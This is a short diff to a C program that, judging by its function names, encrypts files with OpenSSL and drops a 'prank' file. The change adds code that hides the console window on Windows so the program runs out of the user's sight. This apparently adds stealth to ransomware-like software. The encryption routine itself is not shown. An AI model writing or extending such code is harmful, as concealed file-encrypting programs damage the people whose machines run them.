@@ -31,6 +31,10 @@ void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, con
 void create_prank_file(const char* key);
 
 int main() {
+    #ifdef _WIN32
+        HWND myWindow = GetConsoleWindow();
+        ShowWindow(myWindow, SW_HIDE);
+    #endif
 
     OpenSSL_add_all_algorithms();
     ERR_load_crypto_strings();
